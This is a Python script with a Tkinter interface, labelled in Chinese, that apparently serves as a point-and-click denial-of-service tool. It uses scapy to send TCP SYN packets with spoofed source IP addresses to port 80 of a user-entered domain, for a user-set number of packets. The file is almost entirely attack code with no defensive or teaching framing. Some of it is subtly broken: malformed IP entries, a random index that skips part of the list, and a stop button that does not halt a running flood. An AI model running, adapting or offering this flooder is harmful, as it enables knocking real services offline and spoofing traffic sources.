from tkinter import*
from tkinter import messagebox
from scapy.all import IP,TCP,send
import time
import threading
import random
from random import randint
import socket

realm_name = 'None'
frequency = '10'
bools = False


def synflood(tgt,dport,frequency):
    dPort = 80#设置目标监听端口
    IP_list = ['11.1.1.2','23.9.0.102','33.1.3.2','17.9.0.4','10,9,0,5','29,0,3,2']#设置发送数据包ip
    i = 0
    for sPort in range(1024,65535):#设置自己监听端口
        if i < int(frequency):
            index = random.randrange(4)#随机请一个
            
            IPlayer = IP(src=IP_list[index],dst=tgt)
            TCPlayer = TCP(sport=sPort,dport=dPort,flags='S')
            pkt = IPlayer / TCPlayer#构造数据包
            send(pkt)#发送
            i = i + 1
            print('[*]send TCP/IP ==> '+ tgt + ' frequency:'+ str(i))
        else:
            messagebox.showinfo("dos","攻击结束")
            break
    return True

def syn_main(realm_name,frequency):
    if bools == True:
        messagebox.showinfo("dos","攻击开始")
        tgt = socket.gethostbyname(realm_name)#将网址转换为IP
        dPort = 80
        synflood(tgt,dPort,frequency)
    
    return True

def start_dos():
    global bools
    realm_name = en.get()
    frequency = en_1.get()
    bools = True
    t = threading.Thread(target=syn_main, args=(realm_name,frequency))
    t.start()
def stop_dos():
    global bools
    bools = False
    return True
tk = Tk()
tk.title('dos')
tk.geometry('300x160+420+200')
#canvas = Canvas(tk,width=300,height=60,bg='white')
#----------------input-------------
en = Entry(tk)
en.place(x=80,y=5)
en_1 = Entry(tk)
en_1.place(x=80,y=50)

#-----------------text------------

w= Label(tk,text='目标域名:',fg="red")
w.place(x=20,y=5)
w_2= Label(tk,text='攻击次数:',fg="red")
w_2.place(x=20,y=50)



#----------------butter----------

b = Button(tk, text ="开始攻击", command=start_dos)
b.place(x=20,y=80)
b_2 = Button(tk, text ="停止", command=stop_dos)
b_2.place(x=200,y=80)
tk.mainloop()




    

